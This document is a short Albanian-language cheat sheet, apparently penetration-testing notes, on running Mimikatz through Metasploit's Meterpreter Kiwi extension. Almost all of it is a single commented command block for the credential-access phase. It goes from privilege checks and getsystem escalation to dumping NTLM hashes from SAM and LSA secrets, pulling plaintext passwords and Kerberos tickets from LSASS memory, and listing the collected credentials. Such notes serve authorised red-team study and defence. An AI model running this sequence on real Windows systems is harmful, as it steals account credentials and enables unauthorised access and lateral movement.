## Mimikatz ne Metasploit

Metasploit ka module te integruara dhe ne mund te perdorim dhe Mimikatz brenda saj, ku mund te perdorim komanda shume te dobishme.

```bash
# =====================================================
# MIMIKATZ (KIWI) – CREDENTIAL DUMPING VIA METERPRETER
# =====================================================

# -----------------------------------------------------
# 1. Kontrollo privilegjet aktuale
# -----------------------------------------------------

getuid                # Shikon me cilin user je
getprivs              # Shikon privilegjet (kerko SeDebugPrivilege)

# -----------------------------------------------------
# 2. Nëse nuk je SYSTEM – bëj privilege escalation
# -----------------------------------------------------

getsystem             # Tenton të marrë SYSTEM privileges

# -----------------------------------------------------
# 3. Ngarko Mimikatz (Kiwi extension)
# -----------------------------------------------------

load kiwi             # Ngarkon Mimikatz brenda meterpreter session

# -----------------------------------------------------
# 4. Dump NTLM Hashes nga SAM database
# -----------------------------------------------------

hashdump              # Nxjerr NTLM hashes nga SAM (kerkon SYSTEM)

# Alternativë për SAM dump
lsa_dump_sam          # Nxjerr hash-et nga SAM përmes LSA

# -----------------------------------------------------
# 5. Dump LSA Secrets
# -----------------------------------------------------

lsa_dump_secrets      # Nxjerr:
                      # - Service account passwords
                      # - AutoLogon credentials
                      # - Cached domain credentials

# -----------------------------------------------------
# 6. Dump Plaintext Passwords nga LSASS memory
# -----------------------------------------------------

kiwi_cmd "sekurlsa::logonpasswords"
                      # Nxjerr:
                      # - Plaintext passwords
                      # - NTLM hashes
                      # - Kerberos tickets
                      # Kerkon akses ne LSASS memory

# -----------------------------------------------------
# 7. Shfaq të gjitha kredencialet e mbledhura
# -----------------------------------------------------

creds_all             # Liston kredencialet e ruajtura ne session

# =====================================================
# FUND – CREDENTIAL ACCESS PHASE
# =====================================================
```
